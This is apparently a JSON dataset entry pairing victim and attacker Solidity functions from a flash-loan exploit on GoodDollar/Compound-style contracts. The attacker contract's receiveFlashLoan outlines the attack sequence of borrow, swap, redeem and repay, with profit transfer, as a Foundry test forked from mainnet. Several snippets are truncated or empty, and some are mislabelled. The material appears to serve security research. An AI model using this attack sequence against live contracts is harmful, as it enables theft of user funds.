@@ -1,0 +1,170 @@
+[
+  {
+    "contract/interface": "IGoodFundManager",
+    "source_type": "victim_contract",
+    "function_name": "collectInterest",
+    "original_code": "\tfunction collectInterest(\n\t\taddress[] calldata _stakingContracts,\n\t\tbool _forceAndWaiverRewards\n\t) external {\n\t\tuint256 initialGas = gasleft();\n\t\tuint256 gdUBI;\n\t\tuint256 interestInCdai;\n\t\taddress reserveAddress;\n\t\t{\n\t\t\t// require(\n\t\t\t// \tblock.timestamp >= lastCollectedInterest + minCollectedInterestIntervalDays * days,\n\t\t\t// \t\"collectInterest: collect interval not passed\"\n\t\t\t// );\n\t\t\t//prevent stack too deep\n\t\t\tcERC20 iToken = cERC20(nameService.getAddress(\"CDAI\"));\n\t\t\tERC20 daiToken = ERC20(nameService.getAddress(\"DAI\"));\n\t\t\treserveAddress = nameService.getAddress(\"RESERVE\");\n\t\t\t// DAI balance of the reserve contract\n\t\t\tuint256 currentBalance = daiToken.balanceOf(reserveAddress);\n\t\t\tuint256 startingCDAIBalance = iToken.balanceOf(reserveAddress);\n\t\t\tfor (uint256 i = _stakingContracts.length - 1; i >= 0; i--) {\n\t\t\t\t// elements are sorted by balances from lowest to highest\n\n\t\t\t\tif (_stakingContracts[i] != address(0x0)) {\n\t\t\t\t\tIGoodStaking(_stakingContracts[i]).collectUBIInterest(reserveAddress);\n\t\t\t\t}\n\n\t\t\t\tif (i == 0) break; // when active contracts length is 1 then gives error\n\t\t\t}\n\t\t\t// Finds the actual transferred DAI\n\t\t\tuint256 daiToConvert = daiToken.balanceOf(reserveAddress) -\n\t\t\t\tcurrentBalance;\n\n\t\t\t// Mints gd while the interest amount is equal to the transferred amount\n\t\t\t(gdUBI, interestInCdai) = GoodReserveCDai(reserveAddress).mintUBI(\n\t\t\t\tdaiToConvert,\n\t\t\t\tstartingCDAIBalance,\n\t\t\t\tiToken\n\t\t\t);\n\n\t\t\tIGoodDollar token = IGoodDollar(nameService.getAddress(\"GOODDOLLAR\"));\n\t\t\tif (gdUBI > 0) {\n\t\t\t\t//transfer ubi to avatar on sidechain via bridge\n\t\t\t\trequire(\n\t\t\t\t\ttoken.transferAndCall(\n\t\t\t\t\t\tnameService.getAddress(\"BRIDGE_CONTRACT\"),\n\t\t\t\t\t\tgdUBI,\n\t\t\t\t\t\tabi.encodePacked(nameService.getAddress(\"UBI_RECIPIENT\"))\n\t\t\t\t\t),\n\t\t\t\t\t\"ubi bridge transfer failed\"\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\n\t\tuint256 gdRewardToMint;\n\n\t\tif (_forceAndWaiverRewards == false) {\n\t\t\tuint256 totalUsedGas = ((initialGas - gasleft() + gdMintGasCost) * 110) /\n\t\t\t\t100; // We will return as reward 1.1x of used gas in GD\n\t\t\tgdRewardToMint = getGasPriceInGD(totalUsedGas);\n\n\t\t\tGoodReserveCDai(reserveAddress).mintRewardFromRR(\n\t\t\t\tnameService.getAddress(\"CDAI\"),\n\t\t\t\tmsg.sender,\n\t\t\t\tgdRewardToMint\n\t\t\t);\n\n\t\t\tuint256 gasPriceIncDAI = getGasPriceIncDAIorDAI(\n\t\t\t\tinitialGas - gasleft(),\n\t\t\t\tfalse\n\t\t\t);\n\n\t\t\tif (\n\t\t\t\tblock.timestamp >= lastCollectedInterest + collectInterestTimeThreshold\n\t\t\t) {\n\t\t\t\trequire(\n\t\t\t\t\tinterestInCdai >= gasPriceIncDAI,\n\t\t\t\t\t\"Collected interest value should be larger than spent gas costs\"\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "maxUint",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes calldata userData\n    ) external {\n        weth_token.withdraw(amounts[1]);\n\n        bytes memory data1 = abi.encodeWithSignature(\"mint()\");\n        (bool success1,) = ceth.call{value: 450}(data1);\n        require(success1, \"Call failed\");\n\n        address[] memory markets = new address[](1);\n        markets[0] = ceth;\n        IComptroller(compound_comptroller).enterMarkets(markets);\n        ICompoundToken(ccompound_token).borrow(14_995_000_000_000_000_000_000);\n        // double flashloan\n        ISushiSwap(sushi).swap(4_200_000_000_000_000_000_000, 0, address(this), \"0x30\");\n\n        IERC20(compound_token).approve(ccompound_token, maxUint);\n        ICompoundToken(ccompound_token).repayBorrow(14_995_000_000_000_000_000_000);\n        ICompoundToken(ceth).redeem(ceth_token.balanceOf(address(this)));\n        // deposit to exchange weth\n        bytes memory data2 = abi.encodeWithSignature(\"deposit()\");\n        (bool success2,) = weth.call{value: 450 ether}(data2);\n        require(success2, \"Call failed\");\n\n        // payback\n        weth_token.transfer(balancer_vault, 55_693_783_410_001_174_957_472);\n        compound_token.transfer(balancer_vault, 894_410_483_325_707_881_040);\n        // transfer profit to a designated address\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 18_759_541 - 1);\n        deal(address(ctoken), address(this), 2_240_854_452_867); // initial tokens for setting ctoken snapshot\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "GoodCompound",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV2Call",
+    "original_code": "    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        compound_token.approve(univ2_router, maxUint);\n        weth_token.approve(univ2_router, maxUint);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IComptroller",
+    "source_type": "victim_contract",
+    "function_name": "claimComp",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IComptroller",
+    "source_type": "victim_contract",
+    "function_name": "enterMarkets",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICompoundToken",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "    function borrow(uint borrowAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"borrow(uint256)\", borrowAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICompoundToken",
+    "source_type": "victim_contract",
+    "function_name": "comptroller",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICompoundToken",
+    "source_type": "victim_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(address to) external lock returns (uint liquidity) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        uint balance0 = IERC20Uniswap(token0).balanceOf(address(this));\n        uint balance1 = IERC20Uniswap(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        if (_totalSupply == 0) {\n            address migrator = IUniswapV2Factory(factory).migrator();\n            if (msg.sender == migrator) {\n                liquidity = IMigrator(migrator).desiredLiquidity();\n                require(liquidity > 0 && liquidity != uint256(-1), \"Bad desired liquidity\");\n            } else {\n                require(migrator == address(0), \"Must not have migrator\");\n                liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n                _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n            }\n        } else {\n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        }\n        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');\n        _mint(to, liquidity);\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Mint(msg.sender, amount0, amount1);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICompoundToken",
+    "source_type": "victim_contract",
+    "function_name": "redeem",
+    "original_code": "\tfunction redeem(uint256 _amount) internal override {\n\t\trequire(cERC20(address(iToken)).redeemUnderlying(_amount) == 0, \"redeem\");\n\t}\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICompoundToken",
+    "source_type": "victim_contract",
+    "function_name": "repayBorrow",
+    "original_code": "    function repayBorrow(uint repayAmount) external returns (uint) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"repayBorrow(uint256)\", repayAmount));\n        return abi.decode(data, (uint));\n    }\n\n",
+    "description": ""
+  }
+]
